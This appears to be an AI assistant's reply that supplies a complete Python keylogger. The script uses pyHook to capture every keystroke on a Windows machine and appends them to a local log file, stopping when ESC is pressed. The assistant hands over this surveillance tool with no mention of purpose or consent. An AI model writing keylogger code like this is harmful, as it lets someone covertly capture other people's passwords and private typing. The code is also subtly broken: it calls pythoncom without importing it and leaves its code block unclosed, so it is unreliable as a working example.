Here is the Python script that achieves what you require. I used PyHook library for key logging purposes which needs to be installed through pip beforehand :
```python
import os
import sys
import pyHook
import time
import atexit
import winsound

FILE = "keylogs.txt"
DEBUG_MODE = False  # Set True if you want to print debug messages
TERMINATION_KEY = 27  # ESC key, change as per your requirement

def on_key_down(event):
    global DEBUG_MODE, TERMINATION_KEY
    if DEBUG_MODE:
        print(f'Ascii: {event.Ascii}, Key: {repr(event.Key)}') 
    if event.Ascii == TERMINATION_KEY:  # ESC key pressed
        return False # Terminate the current listener and therefore the program

    try:
        with open(FILE, 'a+') as f:
            f.write((repr(event.Key) if event.Ascii == 0 else event.Key))
            f.close()
    except Exception as e:
        # Handle the exception gracefully
        print('Exception occured in writing to file:', str(e))
    return True  # To continue listening other keys

def on_exit():
    """ Callback for program termination. """
    print('Program Terminated')
 
# Register the event listeners
hm = pyHook.HookManager()
hm.KeyDown = on_key_down
hm.HookKeyboard()   
atexit.register(on_exit)  # Register the exit callback
winsound.Beep(1000,200) # Play a beep sound to indicate the program has started
try:
    if DEBUG_MODE: 
        print('Listening for keystrokes. Press ESC to quit')
    pythoncom.PumpMessages()  # Enter into an infinite loop
except Exception as e:
    # Handle the exception gracefully and terminate the app
    on_exit()
